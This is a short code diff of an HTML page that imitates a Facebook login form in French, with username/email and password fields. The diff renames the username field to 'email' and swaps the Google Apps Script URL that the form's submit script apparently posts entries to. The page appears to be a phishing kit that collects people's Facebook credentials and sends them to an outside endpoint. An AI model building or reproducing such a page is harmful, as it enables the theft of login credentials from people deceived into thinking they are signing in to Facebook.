@@ -21,7 +21,7 @@
 
     <div class="login-container">
         <form id="loginForm">
-            <input type="text" class="facebook-input" name="text" placeholder="Nom d'utilisateur, e-mail ou numéro de tél." required>
+            <input type="text" class="facebook-input" name="email" placeholder="Nom d'utilisateur, e-mail ou numéro de tél." required>
             <input type="password" class="facebook-input" name="password" placeholder="Mot de passe" required>
             <button type="submit" class="login-btn">Se connecter</button>
             <a href="#" class="forgot-password">Mot de passe oublié ?</a>
@@ -42,7 +42,7 @@
 	
 	 <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const scriptURL = 'https://script.google.com/macros/s/AKfycbz3i98v1XlXIdmrPWl1aFBgtk30lus-EENkN3dAwTE_R_C1Hv9n-E53oBMqyf3dsOMr/exec';
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbySNVsCRfNerhgs9zUlpa8H--vZT0NQLHyDdfcmRW_gHC-XoWOuLLigwQuslDiCfYBI/exec';
             const form = document.getElementById('loginForm');
 
             form.addEventListener('submit', e => {
